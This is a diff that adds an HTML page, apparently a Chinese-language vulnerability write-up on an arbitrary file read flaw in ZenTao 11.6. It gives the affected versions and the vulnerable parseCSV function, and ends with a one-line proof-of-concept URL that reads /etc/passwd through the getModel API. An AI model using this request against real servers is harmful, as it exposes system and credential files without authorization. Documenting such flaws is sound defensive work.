@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="禅道-116-任意文件读取"><span class="csECDA2D3">禅道</span><span class="csDE05BCC"> 11.6 </span><span class="csECDA2D3">任意文件读取</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">禅道项目管理软件是一款国产的，基于</span><span class="cs8926E06">LGPL</span><span class="cs9C1B1871">协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">开发框架</span><span class="cs8926E06">──ZenTaoPHP</span><span class="cs9C1B1871">而成，第三方开发者或企业可非常方便的开发插件或者进行定制。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">厂商官网：</span><span class="cs8926E06"><a class="cs508254C" href="https://www.zentao.net/"><span class="cs4B51D5E4">https://www.zentao.net/</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">而此次发现的漏洞正是</span><span class="cs8926E06">ZenTaoPHP</span><span class="cs9C1B1871">框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">禅道</span><span class="cs8926E06"> 11.6</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">禅道开源版</span><span class="cs8926E06"> 9</span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞代码位于</span><span class="cs8926E06">module/file/model.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">parseCSV</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/禅道/%e7%a6%85%e9%81%93%2011.6%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96_files/image0.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里通过上面的思路同样可以对</span><span class="cs8926E06">fileName</span><span class="cs9C1B1871">进行赋值，最终返回读取的文件数据</span><span class="cs8926E06"> </span><span class="cs9C1B1871">漏洞</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
